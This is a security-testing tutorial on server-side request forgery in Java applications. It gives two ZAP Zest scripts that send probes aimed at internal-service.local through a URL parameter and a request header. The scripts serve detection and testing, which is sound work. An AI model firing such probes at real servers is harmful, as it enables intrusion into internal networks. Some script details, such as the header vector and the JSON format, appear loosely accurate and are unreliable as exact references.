# Server-Side Request Forgery (SSRF) (CWE-918) in Java

###### Understanding Server-Side Request Forgery (SSRF)

**1. Introduction to SSRF:**
Server-Side Request Forgery (SSRF) is a security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain selected by the attacker. SSRF is typically used to target internal systems behind firewalls that are not accessible from the external network. 

**2. How SSRF Manifests in Java Web Applications:**
Java-based web applications, especially those that fetch data from other servers or services, can be vulnerable to SSRF. In Java, SSRF might exploit:
- URL parameters: directly modifying URLs used in the backend.
- HTTP request bodies: injecting malicious URLs in POST request bodies.
- Cookies and headers: exploiting server logic to manipulate internal networks.
Injection points might appear in code that utilizes:
- `HttpURLConnection`
- Libraries like Apache HttpClient or OkHttp
- RESTful services that accept URL input.

**3. Common Injection Points:**
- URL Parameters
- HTTP Request Bodies
- HTTP Headers
- Cookies
- Query Strings

### Indicators of SSRF

**1. Indicators of Successful SSRF:**
- Unexpected HTTP responses from the server, such as internal service data.
- Changes in HTTP status codes, e.g., `200 OK` for internal endpoints or `403 Forbidden`.

**2. Patterns in Responses:**
- Specific error messages indicating internal service addresses exposure.
- Patterns in response headers showing internal services.

### Creating ZAP Zest Scripts

**1. Zest Script Structure:**
Zest scripts are designed to automate web security tasks by simulating user actions, checking responses, and altering the flow based on conditions.

**2. Zest Script Components:**
- `ZestRequest`: Simulates HTTP requests.
- `ZestAssertion`: Checks conditions in HTTP responses.
- `ZestAction`: Alters or processes based on assertions.
- `ZestExpression`: Adds logic to control script flow.

**3. Sample Scripts:**

**Example 1: URL Parameter SSRF**
```json
{
  "title": "SSRF via URL Parameter",
  "requests": [
    {
      "url": "http://vulnerable-application.com/api?url=http://internal-service.local",
      "method": "GET",
      "headers": [
        {
          "name": "User-Agent",
          "value": "Mozilla/5.0"
        }
      ],
      "index": 1,
      "elementType": "ZestRequest"
    }
  ],
  "assertions": [
    {
      "rootExpression": {
        "code": 200,
        "not": false,
        "elementType": "ZestExpressionStatusCode"
      },
      "elementType": "ZestAssertion"
    },
    {
      "rootExpression": {
        "regex": "secretInfo",
        "location": "BODY",
        "elementType": "ZestConditionRegex"
      },
      "elementType": "ZestAssertion"
    }
  ]
}
```
**Explanation:**
- `ZestRequest`: Sends an HTTP GET request to the vulnerable application with a potentially malicious URL parameter.
- `ZestAssertion`: Checks if the HTTP status code is `200 OK` and searches for a pattern `"secretInfo"` in the response body to verify successful SSRF exploitation.

**Example 2: SSRF via HTTP Headers**
```json
{
  "title": "SSRF via HTTP Headers",
  "requests": [
    {
      "url": "http://vulnerable-application.com/api",
      "method": "POST",
      "headers": [
        {
          "name": "X-Forwarded-For",
          "value": "http://internal-service.local"
        }
      ],
      "data": "param1=value1&param2=value2",
      "index": 1,
      "elementType": "ZestRequest"
    }
  ],
  "assertions": [
    {
      "rootExpression": {
        "code": 200,
        "not": false,
        "elementType": "ZestExpressionStatusCode"
      },
      "elementType": "ZestAssertion"
    },
    {
      "rootExpression": {
        "regex": "Welcome internal user",
        "location": "BODY",
        "elementType": "ZestConditionRegex"
      },
      "elementType": "ZestAssertion"
    }
  ]
}
```
**Explanation:**
- `ZestRequest`: Sends an HTTP POST request with headers designed to target internal services.
- `ZestAssertion`: Checks the response for a successful status code and specific response body patterns to confirm SSRF.

### Conclusion and Recommendations

By leveraging Zest scripting capabilities in OWASP ZAP, security testers can automate the detection of SSRF vulnerabilities more efficiently. Ensure the scripts are tailored to specific Java application behaviors to reduce false positives and negatives. Regularly update and refine the scripts based on the evolving threat landscape and application changes.
